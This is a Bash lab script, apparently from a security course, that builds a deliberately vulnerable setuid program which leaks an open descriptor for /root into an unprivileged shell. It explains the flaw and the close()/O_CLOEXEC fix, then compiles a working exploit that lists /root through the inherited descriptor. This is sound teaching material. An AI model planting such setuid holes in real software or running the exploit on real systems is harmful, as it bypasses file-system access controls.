#!/bin/bash

echo "=== Setup: Criar e compilar o programa vulnerável ==="
# Criação do código C
cat << 'EOF' > backupssi.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main() {
    int dfd;
    char *argv[2];
    
    // O programa abre a diretoria /root
    dfd = open("/root", O_RDONLY);
    if (dfd == -1) {
        perror("open /root");
        exit(1);
    }
    printf("Directory FD is %d\n", dfd);
    
    // Executa a operação privilegiada
    if (mkdir("/root/backupssi", 0700) == -1) {
        perror("mkdir /root/backupssi");
    }
    
    // Deixa cair os privilégios (drop privileges)
    if (setuid(getuid()) == -1){
        perror("setuid");
        exit(1);
    }
    
    // Lança a shell SEM FECHAR O 'dfd'
    argv[0] = "/bin/sh";
    argv[1] = NULL;
    execve(argv[0], argv, NULL);
    
    perror("execve");
    return 0;
}
EOF

# Compilar e aplicar permissões 
gcc -o backupssi backupssi.c
sudo chown root:root backupssi
sudo chmod 4755 backupssi

echo "Programa 'backupssi' compilado e permissões setuid aplicadas."
ls -l backupssi

echo -e "\n=== Análise da Vulnerabilidade e Correção ==="
cat << 'EOF'
2. Identificação da Vulnerabilidade:
A vulnerabilidade de "capability leaking" ocorre porque a diretoria protegida '/root'
é aberta no início do programa (ficando atribuída a um File Descriptor, normalmente o 3).
Ao chamar a função 'execve' para abrir a shell (/bin/sh) com privilégios reduzidos, 
o programa não fecha esse File Descriptor. Assim, a shell "herda" esse acesso aberto
à diretoria '/root', contornando as permissões normais do sistema de ficheiros.

4. Implementação da Correção:
Para mitigar a vulnerabilidade, bastaria adicionar a seguinte linha de código
imediatamente antes da chamada execve():
    close(dfd);
Em alternativa, poderia ser usada a flag O_CLOEXEC no momento da abertura do ficheiro:
    dfd = open("/root", O_RDONLY | O_CLOEXEC);
Isto resolve o problema garantindo que o File Descriptor é destruído antes da shell 
ser lançada, impedindo o acesso não autorizado.
EOF

echo -e "\n=== Setup: Criar e compilar o exploit ==="
# Criação do programa que vai explorar a vulnerabilidade
cat << 'EOF' > exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>

int main() {
    // A função fdopendir() pega num File Descriptor aberto (assumimos que é o 3)
    // e converte-o numa "stream" de diretoria que podemos ler.
    DIR *dir = fdopendir(3);
    
    if (dir == NULL) {
        perror("Erro no fdopendir (o FD 3 não está aberto ou não é uma diretoria)");
        return 1;
    }

    printf("Sucesso! A ler o conteúdo da diretoria protegida através do FD 3 :\n\n");
    
    struct dirent *entry;
    // Lê e imprime cada ficheiro/pasta dentro da diretoria
    while ((entry = readdir(dir)) != NULL) {
        printf(" -> %s\n", entry->d_name);
    }

    closedir(dir);
    return 0;
}
EOF

gcc -o exploit exploit.c
# Garantir que o exploit pertence ao utilizador normal (vboxuser) para não haver problemas
chown vboxuser:vboxuser exploit exploit.c
echo "Programa 'exploit' compilado com sucesso."

echo -e "\n=== Como Testar o Ataque ==="
echo "1. Correr o programa vulnerável no terminal como utilizador normal (SEM sudo):"
echo "   ./backupssi"
echo "2. Na nova shell que vai abrir, executar o ataque:"
echo "   ./exploit"
echo "3. Vai-se ver o conteúdo da pasta /root! 'exit' para saíres da shell."
